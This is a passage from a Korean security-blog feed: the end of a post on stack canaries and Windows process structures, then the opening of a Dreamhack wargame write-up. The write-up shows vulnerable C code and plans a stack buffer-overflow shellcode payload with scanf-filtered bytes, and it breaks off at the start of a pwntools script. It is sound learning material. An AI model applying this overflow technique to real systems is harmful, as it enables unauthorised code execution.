&lt;p&gt;그 결과, rbp의 바로 아래인 ret addr에 내가 의도했던 리턴값이 들어가 있고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x8&lt;/code&gt; 에는 스택 카나리 값이 그대로 들어가 있어 분기 조건에 부합하여 정상적으로 프로그램이 종료되는 루틴을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;번외-삽질이-남긴-지식&quot;&gt;번외: 삽질이 남긴 지식&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-와-리눅스-대상-분석을-하는데-윈도우-프로세스-관리를-가져왔다&quot;&gt;1. 와! 리눅스 대상 분석을 하는데 윈도우 프로세스 관리를 가져왔다?!?&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;와! 샌즈! 아시는구나!&lt;/p&gt;

&lt;p&gt;이걸 쓰는 지금 눈물이 난다….&lt;/p&gt;

&lt;p&gt;아무 생각 없이 PCB에 대해 검색해서 구조체에 대해 열심히 공부하고 정리했는데… 윈도우 거였네&lt;/p&gt;

&lt;p&gt;아무튼 아래 내용은 윈도우의 프로세스 관리 구조체에 대해 서술한 내용이다.&lt;/p&gt;

&lt;p&gt;(나뭇잎 책에도 잘 나와 있는 내용이니 해당 책이 있는 사람들은 그걸 보길 추천한다. 나는 이걸 다 쓰고 나서 나뭇잎 책에 비슷한 내용이 있다는 사실을 깨달았다)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;어떤 프로세스가 실행될 경우, OS는 Time Sharing과 Space Sharing을 모두 적용한 상위 개념인 &lt;strong&gt;프로세스 스케줄링(Process Scheduling)&lt;/strong&gt;을 수행하게 된다. 이는 Multiprogramming을 제공하는 OS가 가진 하드웨어 리소스의 제한 때문에 개발이 시작된 방법이면서, 이후 OS 내부에서 동일 자원에 접근하는 프로세스들이 동시에 실행될 경우 발생할 수 있는 Race Condition(Critical Section의 침해), 혹은 Deadlock(Critical Section을 여러 프로세스가 동시에 요구할 때 발생하는 교착상태)을 막기 위해 더욱 발전한 방법이다.&lt;/p&gt;

&lt;p&gt;이때, Time Sharing의 특성으로 인해 특정 &lt;strong&gt;프로그램 A를 일정 시간(Burst Time) 동안 수행하다가 중단하고, CPU를 다른 프로그램 B에게 할당해야 하는 상황&lt;/strong&gt;이 생긴다. 이럴 경우:&lt;/p&gt;

&lt;p&gt;프로그램 A가 실행되던 상태를 저장하고 → 프로그램 B를 실행한 다음 → 다시 프로그램 A가 자원을 점유(Occupy)할 때 → 이전에 저장된 상태를 불러오는&lt;/p&gt;

&lt;p&gt;일련의 기능이 보장되어야 한다. 이를 위해 만들어진 것을 &lt;strong&gt;PCB&lt;/strong&gt;라고 한다. Process Control Block의 준말이다.&lt;/p&gt;

&lt;p&gt;그리고 이 PCB의 확장판 개념을 &lt;strong&gt;윈도우 OS에서 구현한 것이 바로 EPROCESS 구조체&lt;/strong&gt;다. 이 EPROCESS 구조체의 가장 첫 번째를 차지하는 것이 바로 KPROCESS(PCB) Block이고, &lt;strong&gt;세번째에 PEB 구조체&lt;/strong&gt;를 가지고 있다. &lt;strong&gt;PEB 안에는 이미지 정보, 프로세스 힙 정보와 같은 유저 모드에서 접근할 수 있는 정보가 저장된다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PCB를 가지고 있는 EPROCESS&lt;/strong&gt;와 &lt;strong&gt;PCB인 KPROCESS&lt;/strong&gt;는 모두 &lt;strong&gt;커널 영역&lt;/strong&gt;에 위치해 있어서, 유저 모드의 프로세스가 접근할 수 없기 때문에 &lt;strong&gt;유저 모드인 프로세스도 접근할 수 있도록 PEB를 따로 만들었다&lt;/strong&gt;고 이해하면 된다.&lt;/p&gt;

&lt;p&gt;ETHREAD구조체와 KTHREAD구조체, 그리고 TEB의 관계도 동일하다.&lt;/p&gt;

&lt;p&gt;이 관계를 그림으로 그리면 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2025.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EPROCESS는 ETHREAD를 refer하지만, PEB와 TEB의 연결 관계는 없다.&lt;/p&gt;

&lt;h2&gt;&lt;br /&gt;&lt;/h2&gt;
&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:je&quot;&gt;
      &lt;p&gt;보통 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;je&lt;/code&gt; 명령어는 ZF가 1로 세팅될 시 점프를 수행한다는 특성으로 인해(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jz&lt;/code&gt; 와 동일한 동작을 한다) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmp&lt;/code&gt; 명령어와 함께 쓰인다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmp a, b&lt;/code&gt; 일 때 a-b 연산을 수행하여 0일 때 ZF를 1로 세팅하는 로직이 있기 때문이다. &lt;a href=&quot;#fnref:je&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:TCBTLS&quot;&gt;
      &lt;p&gt;TCB와 TLS를 동치해 사용하는 경우가 많지만 이 둘은 엄연히 구분되는 개념이다. TLS는 프로그래밍 방식의 일환으로서 쓰레드에게 로컬로 사용되는 각종 데이터를 따로 저장해 둔다는 아이디어의 구현이고, TCB는 메모리에 실제로 할당되는 블록으로서 쓰레드 자체의 정보를 저장하는 곳이다. 또한 이 &lt;a href=&quot;https://uclibc.org/docs/tls.pdf&quot;&gt;문서&lt;/a&gt;에 따르면, TCB는 TLS 내부에 존재한다. &lt;a href=&quot;#fnref:TCBTLS&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:MSR&quot;&gt;
      &lt;p&gt;x86 커널에서는 FS와 GS가 GDT(Global Descriptor Table)에 의해 관리된다. &lt;a href=&quot;#fnref:MSR&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:r12&quot;&gt;
      &lt;p&gt;There are sixteen 64-bit registers in x86-64: %rax, %rbx, %rcx, %rdx, %rdi, %rsi, %rbp, %rsp, and %r8-r15. Of these, %rax, %rcx, %rdx, %rdi, %rsi, %rsp, and %r8-r11 are considered caller-save registers, meaning that they are not necessarily saved across function calls. Registers %rbx, %rbp, and %r12-r15 are callee-save registers, meaning that they are saved across function calls. &lt;a href=&quot;#fnref:r12&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 08 Jan 2023 07:44:23 -0600</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step6-1</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step6-1</guid>
      </item>
    
      <item>
        <title>Wargame: Basic_Exploitation_000</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-주어진-정보-분석-취약점-지정&quot; id=&quot;markdown-toc-1-주어진-정보-분석-취약점-지정&quot;&gt;1. 주어진 정보 분석, 취약점 지정&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-취약점-익스플로잇-설계&quot; id=&quot;markdown-toc-2-취약점-익스플로잇-설계&quot;&gt;2. 취약점 익스플로잇 설계&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#2-1-쉘코드-구성&quot; id=&quot;markdown-toc-2-1-쉘코드-구성&quot;&gt;2. 1. 쉘코드 구성&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-2-dump-byte-수-계산&quot; id=&quot;markdown-toc-2-2-dump-byte-수-계산&quot;&gt;2. 2. dump byte 수 계산&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-3-ret-address-알아내기&quot; id=&quot;markdown-toc-2-3-ret-address-알아내기&quot;&gt;2. 3. ret address 알아내기&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-익스플로잇-수행&quot; id=&quot;markdown-toc-3-익스플로잇-수행&quot;&gt;3. 익스플로잇 수행&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;드림핵의 시스템 해킹 기본 문제 중 하나인 basic_exploitation_000을 풀어 보았다.&lt;/p&gt;

&lt;p&gt;종강하고 나서 저번 방학 때 수강하던 트랙을 이어서 수강하고 있는 중이라… 사실 이 문제가 무엇을 취약점으로 가지고 있는지 까먹은 상태로 풀었다. 그래서 익스플로잇을 결정할 때 ROP를 이용한 RTL을 할 건지(입력 가능한 비트수 때문에 탈락) Return Address Overwrite를 할 건지 잠깐 고민했는데, 지금 보니 문제에 Retrun Address Overwrite를 쓰라고 버젓이 나와 있었네… 뭔가를 할 땐 설명서부터 잘 읽는 삶을 살도록 하자. 머쓱해질 수 있으니까,,&lt;/p&gt;

&lt;p&gt;그럼 기존의 절차를 이용해 익스플로잇을 진행해 보도록 하자.
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-주어진-정보-분석-취약점-지정&quot;&gt;1. 주어진 정보 분석, 취약점 지정&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;먼저 서버에서 돌아가고 있는 취약한 프로그램의 바이너리와 소스 코드가 주어졌기 때문에 해당 문제의 난이도가 훅 낮아졌다. (소스 코드를 준 걸 까먹고 바이너리만 본 사람 여깄다… 뭔가를 할 땐 구성품을 잘 확인하는 이하생략)&lt;/p&gt;

&lt;p&gt;소스 코드를 한 번 확인해보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;signal.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;alarm_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TIME OUT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IONBF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IONBF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGALRM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alarm_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;alarm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buf = (%p)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%141s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;사용자에게 입력값을 받아서 버퍼에 저장하는 구조의 코드이다. ‘검증되지 않은 사용자에게서 입력값을 받는 부분’에 boundary check가 되어 있어 언뜻 보기에는 아무 문제 없어 보인다.&lt;/p&gt;

&lt;p&gt;그러나 해당 코드에는 Buffer Overflow 취약점이 존재한다. 선언된 입력값 저장 변수인 buf의 크기는 0x80, 즉 128 byte 인데 boundary check로 제한된 입력값의 최대 길이는 141 byte이기 때문이다. 따라서 총 13byte가 overflow 될 수 있다.&lt;/p&gt;

&lt;p&gt;13byte 라니 고작 저 정도 수로 어떻게 뭐가 가능한 건가 싶다. 그러나 main 함수에 로컬 변수가 buf 하나밖에 선언되지 않았고, 32비트로 컴파일된 프로그램이기 때문에 13byte로 충분히 ebp와 ret address까지 덮어쓸 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그러나 이제까지 배운 대로라면 고작 그 정도 아닐까? ebp와 ret address의 길이를 합하면 8 byte이다. 스택에 함수의 인자를 저장하는 cdecl calling convention의 특성상 ret address를 execve라고 잡으면 그 바로 밑에 execve 스택 프레임의 ret address로 4 byte, 그 밑에 “/bin/sh” 문자열의 주소로 4byte, 총합 8 byte가 최소한으로 더 필요하다.&lt;/p&gt;

&lt;p&gt;즉, 스택 프레임을 전부 덤프로 채우고 ret address 부터 진짜로 의미 있는 값을 넣어 왔던 지난 BOF 방식은 먹히지 않는다.&lt;/p&gt;

&lt;p&gt;현재의 방법이 불가능하다면 새로운 방법을 모색하면 된다. 1) 새로운 가설을 세우고, 2) 그것이 가능한지 확인한 후 3) 가능하다면 실행하면 되는 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/basic_exploitation_000/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;먼저 기존의 방법이다. 기존의 방법이 자주 사용되는 이유는, esp의 위치를 고려하기 편하기 때문이었다. 직전 함수의 epilogue로 인해 자동으로 esp가 ebp가 가리키던 위치를 가리키게 된다는 점이 핵심이다.&lt;/p&gt;

&lt;p&gt;다만 이번 경우에는 위와 같은 방법이 불가능하다.&lt;/p&gt;

&lt;p&gt;그렇다면, 어쨌든 ret address에 들어 있는 메모리의 주소로 eip가 옮겨가므로, 차라리 eip에 buf의 시작 주소를 주고 buf 안에 쉘코드를 채우면 ‘ebp 아래 공간의 부족’ 이라는 한계를 해결할 수 있지 않을까?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/basic_exploitation_000/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;바로 위의 그림처럼 말이다. 그러나 해당 방법이 성공하려면 stack에 execute 권한이 있어야 한다. 즉, NX-bit가 걸려있지 않아야 한다. gdb를 이용해 스택의 권한을 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/basic_exploitation_000/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;가장 아래의 [stack]에는 read, write, execution 권한이 있고, private(copy on write)로 설정되어 있다. p가 올 자리에 s가 왔다면 그건 프로세스가 해당 영역을 변경하는 것이 비밀이 아니라는(shared) 뜻이다.&lt;/p&gt;

&lt;p&gt;private(copy on write)로 설정된 메모리 영역에 대한 설명은 아래를 참고하자!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;**&lt;Private Mapping=&quot;&quot;&gt;**&lt;/Private&gt;&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;Private mapping (MAP_PRIVATE):&lt;/strong&gt; Modifications to the contents of the mapping are not visible to other processes.&lt;/p&gt;

  &lt;p&gt;For file mapping they are not carried through to the underlying file. Changes to the contents of the mapping are nevertheless private to each process.&lt;/p&gt;

  &lt;p&gt;The kernel accomplishes this by using the &lt;strong&gt;copy-on-write&lt;/strong&gt; technique. This means that whenever a process attempts to modify the contents of a page, the kernel first creates a new, separate copy of that page for the process (and adjusts the process’s page tables).&lt;/p&gt;

  &lt;p&gt;For this reason, a MAP_PRIVATE mapping is sometimes referred to as a private, copy-on-write mapping. (Source: The Linux Programming Interface book)&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;정리하자면, 현재 프로세스의 스택에는 실행 권한이 있기 때문에 스택에 들어 있는 인스트럭션을 rip가 가리킨다면 실행될 수 있다. 즉, 앞서 말했던 방법이 ROP 등의 NX-bit bypass 없이도 성공할 수 있다. 
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-취약점-익스플로잇-설계&quot;&gt;2. 취약점 익스플로잇 설계&lt;/h1&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞서 지정한 취약점을 익스플로잇하기 위한 페이로드의 구조는 아래와 같을 것이다.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shellcode(execve(&quot;/bin/sh&quot;, 0, 0)) + dump byte + RET address(buf[0])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이제 익스플로잇 구성에 필요한 각 정보를 알아내 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-1-쉘코드-구성&quot;&gt;2. 1. 쉘코드 구성&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 직접 쉘코드를 만드는 방법도 있다. 이전의 포스트에서 했던 것처럼 C 언어 코드를 짜고 그것을 오브젝트 코드로 컴파일해도 되고, 어셈블리로 바로 코드를 짜도 된다.&lt;/p&gt;

&lt;p&gt;그러나 실전에서는 내가 직접 쉘코드를 짠다는 것은 시간과 자원 낭비다. 이미 좋은 자동화 도구들이 있기 때문이고, 특정 바이트들을 피해 쉘코드를 짜야 하는 경우가 생기는데 사실 사람 머리로는 정말 힘든 작업이기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;쉘코드를 만들 수 있는 해킹 툴에는 여러 가지가 있다. 그러니 각자 입맛대로 metasploit을 사용해도 되고, pwntools를 사용해도 된다.&lt;/p&gt;

&lt;p&gt;metasploit의 경우 cmd 툴로 사용되고, pwntools로는 shellcraft라는 모듈을 cmd 툴로 사용하거나 여타 모듈을 이용해 파이썬 코드로 원하는 쉘코드를 만들어낼 수 있다. 나는 이번 익스플로잇 작성에 pwntools를 사용했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞서 설명하면서, 쉘코드를 짤 때 특정 바이트들을 피해 쉘코드를 짜야 한다는 말을 했다. 사실 이번 익스플로잇 구성에서 정확히 이런 일이 일어나는 바람에 shellcraft를 사용했다.&lt;/p&gt;

&lt;p&gt;쉘코드를 입력했을 때 특정 바이트들부터 입력이 뚝 잘려서 안 들어가거나, 혹은 쉘코드는 잘 들어갔는데 eip가 실행 중간에 멈춰버리는 일이 일어날 수 있다.&lt;/p&gt;

&lt;p&gt;전자의 경우 stdin을 받는 함수의 특성으로 인해 특정 바이트 값을 입력의 끝(예: 0x00 null)으로 인식해서 발생하는 문제이고, 후자의 경우는 bad character(예: 0x90 nop)로 인해 발생하는 문제이다.&lt;/p&gt;

&lt;p&gt;전자의 해결책은 0x00부터 0xff까지를 전부 메모리에 넣어주면서 문제가 생기는 바이트를 하나씩 제거하고 다시 보내기를 반복하면서 입력에 문제가 생기는 바이트의 리스트를 만드는 것이고, 후자의 해결책은 실행 중 eip가 stuck 되는 바이트를 찾아내서 서서히 제외시키는 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;bad character는… 내가 알기로는 CPU가 이상한 바이트라고 생각해 코드의 흐름을 멈춰세우도록 만드는 바이트를 의미하고 각 CPU나 메모리 상태에 따라 그 종류가 달라지기 때문에 사실상 랜덤이라고는 하는데, 지금 약간 의심이 생긴다.&lt;/p&gt;

&lt;p&gt;&lt;del&gt;stdin을 받는 함수 특성으로 인해 발생하는 문제에다가 bad character라는 이름을 붙인 거 아냐?&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;익스플로잇 대상의 소스를 확인해 보면 사용자의 입력값을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; 함수를 이용해 받는다. 그런데 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; 는 특정 바이트는 무시하는 특징이 있다. 즉, Null byte(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x00&lt;/code&gt;) 만을 입력값의 종료로 인식하는 게 아니라는 거다.&lt;/p&gt;

&lt;p&gt;잘 생각해 보면 맞다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; 함수를 이용해 사용자 입력값을 받을 때 공백(space, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x20&lt;/code&gt;)을 중간에 넣는다면 문자열은 정확히 공백 앞까지만 입력된다.&lt;/p&gt;

&lt;p&gt;이처럼, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; 가 거부하는 특수한 바이트가 있다. 그 목록은 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x09&lt;/strong&gt; : ctrl+I; HT로, 탭 문자&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x0a&lt;/strong&gt;: ctrl+J; LF로, 유닉스에서 사용되는 개행 문자&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x0b&lt;/strong&gt;: ctrl+K; VT로, Vertical Tab&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x0c&lt;/strong&gt;: ctrl+L; FF로, Form Feed(다음 페이지)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x0d&lt;/strong&gt;: CR; Carriage Return(캐리지 리턴 (\r))&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;\x20&lt;/strong&gt;: Space(공백)&lt;/p&gt;

&lt;p&gt;해당 바이트들을 제외하고 execve(”/bin/sh”, 0, 0) 쉘코드를 만들기 위해 아래와 같이 코드를 작성했다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;i386&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;linux&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
